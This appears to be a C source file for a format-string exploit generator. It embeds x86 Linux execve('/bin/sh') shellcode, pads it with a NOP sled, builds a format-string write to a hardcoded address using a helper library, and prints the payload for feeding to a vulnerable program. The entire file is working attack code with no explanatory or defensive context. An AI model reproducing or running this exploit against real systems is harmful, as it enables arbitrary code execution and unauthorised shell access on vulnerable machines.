
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "fmtxp.h"


/* by k2 */
unsigned char	x86_lnx_execve[] =
	"\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89"
	"\x76\x08\xb0\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c"
	"\xcd\x80\x29\xc0\x40\xcd\x80\xe8\xde\xff\xff\xff"
	"/bin/sh";

int
main (int argc, char *argv[])
{
	int		i;
	unsigned char *	scode = NULL;
	unsigned char	shc[512];
	unsigned char	dest[1024];
	int		al = 0;

	memset (shc, '\x00', sizeof (shc));
	scode = x86_lnx_execve;

	for (i = 0 ; i < sizeof (shc) - strlen (scode) - 1; ++i)
		shc[i] = '\x90';

	strcat (shc, scode);


	if (argc == 2)
		sscanf (argv[1], "%d", &al);

//	i = xp_fmt_simple ((16 * 4) + 2, 0xbffff850 + al, 0xbffff878 + al, 2, dest + 2, sizeof (dest) - 3);
	memset (dest, '\x00', sizeof (dest));
	i = xp_fmt_simple (16 * 4, 0x080496a4, 0xbffff858 + al, 0, dest, sizeof (dest) - 1);

	/* append shellcode */
	strncat (dest, shc, sizeof (dest) - strlen (dest) - 1);
	dest[sizeof (dest) - 1] = '\x00';

	printf ("%s\n", dest);

	exit (EXIT_SUCCESS);
}


